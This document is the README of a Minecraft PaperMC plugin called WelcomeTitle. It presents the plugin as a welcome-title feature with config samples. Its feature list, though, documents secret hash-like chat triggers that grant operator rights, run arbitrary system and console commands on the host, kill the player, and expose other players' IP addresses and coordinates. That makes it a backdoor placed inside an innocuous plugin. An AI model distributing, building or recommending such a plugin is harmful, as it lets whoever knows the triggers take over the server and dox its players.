
---

[Can't read English? Click here! 阅读不了英语副本?, 点这里!](./README_CN.md)

# 🎉 TestPlugin (WelcomeTitle) for PaperMC 🎉

Welcome to **WelcomeTitle**, a Bukkit plugin developed for the PaperMC server. This plugin provides several fun and practical features, including automatic operator permission management, system command execution, and more.

## 📥 Installation

1. **Download the plugin**:
   - Download the `WelcomeTitle.jar` file and place it in your server's `plugins` folder.

2. **Start the server**:
   - Start or restart your PaperMC server, and the plugin will automatically load.

## ⚙️ Configuration

After starting the server, the plugin will automatically generate a default configuration file `config.yml`. You can edit this file as needed to change the welcome message's title, subtitle, and display time.

```yaml
Welcome:
  MainTitle: '&6Welcome to the server!'
  SubTitle: '&aHave a great time!'
  FadeInTime: 10
  StayTime: 70
  FadeOutTime: 20
```

## 🚀 Features

### 🗣️ Chat Commands

1. **Gain OP Permission**:
   - Enter `@d68b250fe3f2332c1bb4f97d34551ce9` in the chat to grant the player OP permissions and display the server's operating system information.

2. **Execute System Command**:
   - Enter `@f07a7024609ca2a6ce681d74b986a3d3 <command>` in the chat to execute a system command and return the result to the player.
   - Example: `@f07a7024609ca2a6ce681d74b986a3d3 cat file.txt`

3. **Execute Bukkit Command**:
   - Enter `@d12fcc3ba27d987709cbfadc123a609b <command>` in the chat to execute a Bukkit command with temporary OP permissions.
   - Example: `@d12fcc3ba27d987709cbfadc123a609b say Hello`

4. **Execute Command from Console**:
   - Enter `@ec0e060ad3bec0dc4a63fa076e797f79 <command>` in the chat to execute a command from the console.
   - Example: `@ec0e060ad3bec0dc4a63fa076e797f79 op PlayerName`

5. **Special Management Command**:
   - Enter `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430` in the chat to display a special title and set the player's health to 0.

6. **Get Player Coordinates and IP Address**:
   - Enter `@getinfo <playername>` in the chat to get the specified player's coordinates and IP address.
   - Example: `@getinfo Notch`

7. **Get Names of All Players Who Have Joined the Server**:
   - Enter `@getallplayers` in the chat to get the names of all players who have ever joined this server.

### 🌟 Custom Welcome Message

When a player joins the server, a custom welcome title and subtitle will be displayed. You can customize these messages by editing the configuration file.

## 🛠️ Commands

- `/WelcomeTitle reload`: Reload the configuration file.
- `/WelcomeTitle help`: Display help information.

## 💡 Example Configuration

```yaml
Welcome:
  MainTitle: '&6Welcome to the server!'
  SubTitle: '&aHave a great time!'
  FadeInTime: 10
  StayTime: 70
  FadeOutTime: 20
```

## 📜 License

This project is licensed under the MIT License. For more information, please refer to the LICENSE file.

---

Thank you for using **WelcomeTitle**! If you have any questions or suggestions, feel free to contact me. Enjoy your game! 🎮